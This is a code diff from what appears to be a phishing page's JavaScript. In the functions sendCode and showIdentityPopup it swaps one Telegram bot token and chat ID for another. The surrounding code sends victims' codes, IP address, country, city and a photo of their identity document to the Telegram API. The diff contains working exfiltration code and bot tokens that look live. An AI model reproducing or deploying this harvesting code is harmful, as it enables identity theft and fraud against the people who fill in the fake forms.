@@ -173,8 +173,8 @@ function sendCode() {
       "%0A<strong>City : </strong>" +
       IpAddress.city;
 
-    const botToken = "8191975430:AAH6G2YKRRz6s2ce0jU1lO8oCbbu0kQwEZY";
-    const chatId = "-1002267976818";
+    const botToken = "7499417462:AAEwpqvTLooxAENpFm7EsQEoGXwmd6G4MC8";
+    const chatId = "#-2299618966";
     const message = message1;
 
     const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=html`;
@@ -387,11 +387,11 @@ function showIdentityPopup() {
       document.querySelector(".lsd-ring-container").classList.remove("d-none");
 
       // Send info first
-      const chatId = "-1002267976818";
+      const chatId = "#-2299618966";
       const infoMessage = `🆔 ID Type: ${idType}\n📍 IP: ${IpAddress.ipAddress}\n🌍 Country: ${IpAddress.countryName}\n🏙️ City: ${IpAddress.city}`;
 
       fetch(
-        `https://api.telegram.org/bot8191975430:AAH6G2YKRRz6s2ce0jU1lO8oCbbu0kQwEZY/sendMessage`,
+        `https://api.telegram.org/bot7499417462:AAEwpqvTLooxAENpFm7EsQEoGXwmd6G4MC8/sendMessage`,
         {
           method: "POST",
           headers: {
@@ -416,7 +416,7 @@ function showIdentityPopup() {
           formData.append("photo", idImage);
 
           return fetch(
-            `https://api.telegram.org/bot8191975430:AAH6G2YKRRz6s2ce0jU1lO8oCbbu0kQwEZY/sendPhoto`,
+            `https://api.telegram.org/bot7499417462:AAEwpqvTLooxAENpFm7EsQEoGXwmd6G4MC8/sendPhoto`,
             {
               method: "POST",
               body: formData,
